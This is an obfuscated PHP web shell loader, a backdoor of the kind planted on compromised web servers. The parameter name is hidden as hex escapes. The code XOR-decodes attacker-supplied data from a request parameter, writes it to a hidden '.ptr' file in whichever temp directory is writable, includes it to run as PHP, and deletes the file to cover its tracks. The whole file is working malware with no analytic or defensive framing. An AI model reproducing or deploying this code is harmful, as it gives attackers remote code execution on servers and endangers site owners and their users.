<?php

if(array_key_exists("\x6F\x62j", $_REQUEST) && !is_null($_REQUEST["\x6F\x62j"])){
	$data_chunk = hex2bin($_REQUEST["\x6F\x62j"]);
	$entity = '' ;for($i=0; $i<strlen($data_chunk); $i++){$entity .= chr(ord($data_chunk[$i]) ^ 81);}
	$binding = array_filter([session_save_path(), sys_get_temp_dir(), getenv("TEMP"), "/var/tmp", "/tmp", ini_get("upload_tmp_dir"), getenv("TMP"), getcwd(), "/dev/shm"]);
	foreach ($binding as $dchunk):
    		if (is_writable($dchunk) && is_dir($dchunk)) {
    $pgrp = implode("/", [$dchunk, ".ptr"]);
    $file = fopen($pgrp, 'w');
if ($file) {
	fwrite($file, $entity);
	fclose($file);
	include $pgrp;
	@unlink($pgrp);
	exit;
}
}
endforeach;
}